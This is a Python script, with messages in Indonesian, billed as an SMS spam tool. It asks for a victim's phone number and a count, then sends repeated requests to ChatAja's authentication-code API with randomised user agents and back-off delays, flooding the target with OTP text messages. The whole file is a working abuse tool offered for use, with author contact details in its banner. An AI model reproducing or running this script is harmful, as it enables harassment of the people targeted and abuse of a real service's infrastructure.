# -*- coding: utf-8 -*-
try:
        import json, os, sys, requests,time
        from fake_useragent import UserAgent
except ImportError as error:
    print ('[•] Module belum diinstall, silahkan install terlebih dahulu dengan perintah "pip install -r requirements.txt"')
ua = UserAgent()
r = requests

def aso(t):
    while t:print('[-] Jeda selama '+str(t)+" detik ",end='\r',flush=True);time.sleep(1);t -= 1
def spam():
    if b:
                        print(f"[+] Succes mengirim spam ke {no}")
                        aso(1)
    else:
                        print(f"[×] Gagal mengirim spam ke {no}")
                        aso(30)

if os.name == 'nt':os.system('cls')
else:os.system('clear')
print ("""\n██████╗██╗  ██╗ █████╗ ████████╗ █████╗      ██╗ █████╗ 
██╔════╝██║  ██║██╔══██╗╚══██╔══╝██╔══██╗     ██║██╔══██╗
██║     ███████║███████║   ██║   ███████║     ██║███████║
██║     ██╔══██║██╔══██║   ██║   ██╔══██║██   ██║██╔══██║
╚██████╗██║  ██║██║  ██║   ██║   ██║  ██║╚█████╔╝██║  ██║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝
                                                         \n""")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Sms ChatAja | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
try:
        no = input("[~] Masukkan nomor target (62xx) : ")
        dat = json.dumps({"user":{"app_id":"kiwari-prod","phone_number":no}})
        ajg = int(input("[~] Massukan Jumlah spam: "))
        os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
        z = 1
        for i in range(ajg):
                a = r.post('https://api.chataja.co.id/api/v2/auth_nonce',data=dat,headers={"Accept": "application/json, text/plain, */*","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Connection": "keep-alive","Content-Length": "65","Content-Type": "application/json;charset=UTF-8","Host": "api.chataja.co.id","Origin": "https://web.chataja.co.id","Referer": "https://web.chataja.co.id/","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-site","User-Agent": ua.random}).text;b = json.loads(a)["data"]
                spam()
except Exception as e:exit(f"[x] Error {e}")
except KeyboardInterrupt:exit()
except requests.exceptions.ConnectionError:exit('[^] Periksa internet kamu ^v^')

